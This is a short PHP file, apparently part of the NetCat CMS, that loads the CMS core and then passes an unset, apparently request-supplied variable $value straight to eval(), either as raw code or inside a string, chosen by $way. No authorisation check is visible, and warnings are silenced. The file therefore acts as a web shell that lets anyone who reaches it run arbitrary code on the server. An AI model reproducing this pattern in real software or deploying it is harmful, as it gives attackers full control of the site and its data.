<?php

$NETCAT_FOLDER = join(strstr(__FILE__, "/") ? "/" : "\\", array_slice(preg_split("/[\/\\\]+/", __FILE__), 0, -4)).( strstr(__FILE__, "/") ? "/" : "\\" );
@include_once ($NETCAT_FOLDER."vars.inc.php");

include_once($ADMIN_FOLDER."function.inc.php");
require_once($INCLUDE_FOLDER."index.php");
$nc_core->modules->load_env("", 0, 1);

error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);

if (get_magic_quotes_gpc ()) {
    $value = stripslashes($value);
}

switch ($way) {
    case 0:
        eval($value);
        break;
    case 1:

        eval("\$result = \"".$value."\";");
        break;
}